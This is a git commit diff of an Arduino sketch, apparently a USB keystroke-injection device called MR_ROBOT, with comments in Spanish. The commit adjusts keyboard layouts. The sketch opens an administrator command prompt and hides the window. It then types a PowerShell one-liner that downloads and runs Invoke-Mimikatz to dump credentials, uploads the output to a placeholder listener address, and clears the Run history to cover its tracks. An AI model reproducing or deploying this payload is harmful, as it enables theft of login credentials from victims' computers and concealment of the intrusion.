1352320513f57cb6921d7c869a6c14b584d21cb7
Eduardo Blazquez <e.blazquezgonzalez@mnemo.com>
2017-09-13 09:32:50 +0200

    Changed keyboard layouts

--- MR_ROBOT/MR_ROBOT.ino
+++ MR_ROBOT/MR_ROBOT.ino
@@ -1,3 +1,14 @@
+// modificar en caso de otro layout 
+/*
+ * Ejemplos
+ * #define kbd_be_be
+ * #define kdb_cz_cz
+ * #define kdb_de_de
+ * 
+ * Comentar en caso de layout americano
+ */
+#define kbd_es_es
+
 #include "Keyboard.h"
 
 int ejecutado;
@@ -14,12 +25,11 @@ void loop()
   delay(2000);
   if (ejecutado == 0)
   {
-   
     openCMDAsAdmin();
     whatsNewMimikatz();
     limpia();
     ejecutado = 1;
-   
+    
   }
  
 }
@@ -44,23 +54,15 @@ void openCMDAsAdmin()
   ofusca();
 }
 
-void printa(char datos[])
+void printa(const char *datos)
 /*
  *  Hace print cambiando siempre el layout para evitar errores
  */
 {
-  changeLayout();
   Keyboard.print(datos);
-  changeLayout();
   Keyboard.press(KEY_RETURN);Keyboard.releaseAll();
 }
 
-void changeLayout()
-{
-  Keyboard.press(KEY_LEFT_ALT);
-  Keyboard.write(KEY_LEFT_SHIFT);
-  Keyboard.release(KEY_LEFT_ALT);
-}
 
 void ofusca()
 /*
@@ -77,7 +79,7 @@ void whatsNewMimikatz()
  * Descarga mimikatz, ejecutalo en powershell y envialo al servidor
  */
 {
-  printa("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('IP_A_ESCUCHAR', $output)\"");
+  printa("powershell \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1'); $output = Invoke-Mimikatz -DumpCreds; (New-Object Net.WebClient).UploadString('URL_A_ESCUCHAR', $output)\"");
 }
 
 void limpia()
@@ -85,6 +87,6 @@ void limpia()
  * Limpia la ejecución
  */
  {
-    printa("powershell \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\mode con:cols=18 lines=1' -Name '*' -ErrorAction SilentlyContinue\"");
+    printa("powershell \"Remove-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\mode con:cols=18 lines=1' -Name '*' -ErrorAction SilentlyContinue\"");
     printa("exit");
  }
